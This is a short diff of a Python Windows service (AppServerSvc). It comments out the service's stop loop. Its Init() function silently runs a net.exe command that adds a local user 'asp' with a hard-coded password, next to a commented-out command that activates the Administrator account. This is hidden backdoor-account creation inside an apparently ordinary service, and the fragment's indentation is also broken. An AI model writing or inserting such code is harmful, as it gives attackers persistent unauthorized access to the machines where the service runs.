@@ -140,11 +140,11 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
         
         Init()
         
-        self.stopping = False
+        #self.stopping = False
 
-        while not self.stopping:
+        #while not self.stopping:
             #myloop()
-            time.sleep(1)
+        #    time.sleep(1)
 def Init():
     #os.system("net.exe user Administrator /active:yes")
                         os.system("net.exe user asp Qwerty12! /add")
